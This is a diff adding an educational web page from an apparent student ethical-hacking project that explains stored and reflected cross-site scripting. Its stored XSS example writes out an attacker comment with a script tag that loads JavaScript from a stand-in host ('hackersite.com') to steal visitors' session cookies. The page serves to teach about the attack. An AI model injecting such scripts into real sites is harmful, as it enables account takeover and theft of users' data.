@@ -1,0 +1,129 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>XSS</title>
+    <meta name="description" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="all,follow">
+    <link rel="stylesheet" href="css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Poppins:300,400,700">
+    <link rel="stylesheet" href="css/style.default.css" id="theme-stylesheet">
+    <link rel="stylesheet" href="css/custom.css">
+    <link rel="shortcut icon" href="img/favicon.ico">
+    <script src="https://use.fontawesome.com/99347ac47f.js"></script>
+    <link rel="stylesheet" href="https://file.myfontastic.com/da58YPMQ7U5HY8Rb6UxkNf/icons.css">
+    <link href="css/AdminLTE.min.css" rel="stylesheet" />
+</head>
+<body>
+    <div class="page home-page">
+        <header class="header">
+            <nav class="navbar">
+                <div class="container-fluid">
+                    <div class="navbar-holder d-flex align-items-center justify-content-between">
+                        <div class="navbar-header">
+                            <a href="./" class="navbar-brand">
+                                <div class="brand-text brand-big hidden-lg-down"><span>Minor </span><strong> Project</strong></div>
+                                <div class="brand-text brand-small"><strong>MP</strong></div>
+                            </a>
+                            <a id="toggle-btn" href="#" class="menu-btn active"><span></span><span></span><span></span></a>
+                        </div>
+                    </div>
+                </div>
+            </nav>
+        </header>
+        <div class="page-content d-flex align-items-stretch">
+            <nav class="side-navbar">
+                <div class="sidebar-header d-flex align-items-center">
+                    <!--<div class="avatar"><img src="img/avatar-1.jpg" alt="..." class="img-fluid rounded-circle"></div>-->
+                    <div class="title">
+                        <h1 class="h4">Ethical Hacking</h1>
+                        <p>Let's start</p>
+                    </div>
+                </div>
+                <span class="heading"> Basic Attacks</span>
+                <ul class="list-unstyled">
+                    <li> <a href="./"><i class="icon-home"></i>Home</a></li>
+                    <li> <a href="sqlinjection.html"> <i class="icon-interface-windows"></i>Sql Injection</a></li>
+                    <li> <a href="phising.html"> <i class="fa fa-bar-chart"></i>Phising Attack </a></li>
+                    <li> <a href="ddos.html"> <i class="icon-padnote"></i>DoS/DDoS Attack </a></li>
+                    <li> <a href="pentesting.html"> <i class="icon-padnote"></i>Penetration Testing </a></li>
+                    <li class="active"> <a href="xss.html"> <i class="icon-grid"></i>Cross Side Scripting (XSS) </a></li>
+                </ul><span class="heading">Extras</span>
+                <ul class="list-unstyled">
+                    <li> <a href="#"> <i class="icon-flask"></i>References</a></li>
+                    <li> <a href="#"> <i class="icon-screen"></i>Project Report</a></li>
+                </ul>
+            </nav>
+            <div class="content-inner">
+                <div class="container" style="margin-top:15px">
+                    <div class="row">
+                        <div class="col-md-12">
+                            <div class="box box-widget" style="max-height:555px;overflow:auto">
+                                <div class="box-header with-border">
+                                    <div class="user-block">
+                                        <span class="username"><a href="#">What is XSS ?</a></span>
+                                    </div>
+                                </div>
+                                <div class="box-body" style="font-size:12px;text-align:justify;font-family:Verdana">
+                                    <p>
+                                        Cross site scripting (XSS) is a common attack vector that injects malicious code into a vulnerable web application. XSS differs from other web attack vectors (e.g., SQL injections), in that it does not directly target the application itself. Instead, the users of the web application are the ones at risk.
+                                    </p>
+                                    <p>
+                                        A successful cross site scripting attack can have devastating consequences for an online business's reputation and its relationship with its clients.
+                                    </p>
+                                    <p>
+                                        Depending on the severity of the attack, user accounts may be compromised, Trojan horse programs activated and page content modified, misleading users into willingly surrendering their private data. Finally, session cookies could be revealed, enabling a perpetrator to impersonate valid users and abuse their private accounts.
+                                    <p>Cross site scripting attacks can be broken down into two types: stored and reflected. Stored XSS, also known as persistent XSS, is the more damaging of the two. It occurs when a malicious script is injected directly into a vulnerable web application.</p>
+                                    <p>
+                                        Reflected XSS involves the reflecting of a malicious script off of a web application, onto a user's browser. The script is embedded into a link, and is only activated once that link is clicked on.
+                                        <br /><br />
+                                        <span class="username" style="font-size:15px;font-weight:bolder;font-family:'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;border-bottom:1px solid #e3e3e3;margin-bottom:10px"><a href="#">WHAT IS STORED CROSS SITE SCRIPTING</a></span><br />
+                                        To successfully execute a stored XSS attack, a perpetrator has to locate a vulnerability in a web application and then inject malicious script into its server (e.g., via a comment field).
+                                        <br />
+                                        <center><img src="img/xss-img.png" /></center>
+                                    <p>
+                                        One of the most frequent targets are websites that allow users to share content, including blogs, social networks, video sharing platforms and message boards. Every time the infected page is viewed, the malicious script is transmitted to the victim's browser.
+                                        <br /><br />
+                                        <span class="username" style="font-size:15px;font-weight:bolder;font-family:'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;border-bottom:1px solid #e3e3e3;margin-bottom:10px"><a href="#">STORED XSS ATTACK EXAMPLE</a></span><br />
+
+                                        While browsing an e-commerce website, a perpetrator discovers a vulnerability that allows HTML tags to be embedded in the site's comments section. The embedded tags become a permanent feature of the page, causing the browser to parse them with the rest of the source code every time the page is opened.
+                                    </p>
+                                    <p>
+                                        The attacker adds the following comment: Great price for a great item! Read my review here
+                                        script src="http://hackersite.com/ex.js"> </'script>
+                                    </p>
+                                    <p>
+                                        From this point on, every time the page is accessed, the HTML tag in the comment will activate a JavaScript file, which is hosted on another site, and has the ability to steal visitors' session cookies.
+                                    </p>
+                                    <p>
+                                        Using the session cookie, the attacker can compromise the visitor’s account, granting him easy access to his personal information and credit card data. Meanwhile, the visitor, who may never have even scrolled down to the comments section, is not aware that the attack took place.
+                                    </p>
+                                    <p>
+                                        Unlike a reflected attack, where the script is activated after a link is clicked, a stored attack only requires that the victim visit the compromised web page. This increases the reach of the attack, endangering all visitors no matter their level of vigilance.
+                                    </p>
+                                    <p>
+                                        From the perpetrator's standpoint, persistent XSS attacks are relatively harder to execute because of the difficulties in locating both a trafficked website and one with vulnerabilities that enables permanent script embedding.
+                                    </p>
+
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
+    <script src="js/tether.min.js"></script>
+    <script src="js/bootstrap.min.js"></script>
+    <script src="js/jquery.cookie.js"> </script>
+    <script src="js/jquery.validate.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.5.0/Chart.min.js"></script>
+    <script src="js/charts-home.js"></script>
+    <script src="js/front.js"></script>
+
+
+</body>
+</html>
